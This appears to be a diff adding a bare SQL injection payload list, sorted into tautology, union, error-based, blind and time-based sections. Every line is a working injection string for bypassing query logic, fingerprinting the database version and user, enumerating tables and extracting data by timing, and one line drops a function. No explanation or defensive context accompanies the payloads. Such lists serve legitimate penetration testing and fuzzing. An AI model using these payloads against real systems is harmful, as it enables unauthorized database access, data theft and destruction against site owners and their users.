@@ -1,0 +1,39 @@
+Tautology-Based (Boolean-Based)
+15' OR 1=1 -- -
+15' OR 3409=3409 AND ('pytW' LIKE 'pytW') -- -
+AS INJECTX WHERE 1=1 AND 1=1 -- -
+ORDER BY 18#
+RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='' -- -
+IF 7423=7423 SELECT 7423 ELSE DROP FUNCTION xcjl; -- -
+
+Union-Based
+ORDER BY 1,SLEEP(5) -- -
+ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8 -- -
+UNION ALL SELECT 1,2,3,4,5,6 -- -
+UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5 -- -
+UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')) -- -
+UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4 -- -
+
+Error-Based
+1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION(), 0x7e)) -- -
+1 AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e)) -- -
+1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 1) x) -- -
+1 AND CONVERT(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) -- -
+1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS UNSIGNED) -- -
+1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, DATABASE(), 0x7e), FLOOR(RAND(0)*2) AS x FROM information_schema.tables GROUP BY x) t) -- -
+
+Blind SQL
+1' AND 1=1-- -
+1' AND ASCII(SUBSTRING(DATABASE(),1,1))=109-- -
+1' AND IF(1=1, SLEEP(5), 0)-- -
+1' AND IF(ASCII(SUBSTRING(USER(),1,1))=114, SLEEP(5), 0)-- -
+1' AND IF(LENGTH(DATABASE())=5, SLEEP(5), 0)-- -
+1' AND IF(SUBSTRING(DATABASE(),1,2)='my', SLEEP(5), 0)-- -
+
+Time-Based
+1' AND SLEEP(5)-- -
+1' AND IF(1=1, SLEEP(5), 0)-- -
+1' AND IF((SELECT COUNT(*) FROM information_schema.tables)>0, SLEEP(5), 0)-- -
+1' AND IF((SELECT table_name FROM information_schema.tables LIMIT 1)='users', SLEEP(5), 0)-- -
+1' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))=117, SLEEP(5), 0)-- -
+1' AND IF((SELECT SUBSTRING(@@version,1,1))='8', SLEEP(5), 0)-- -
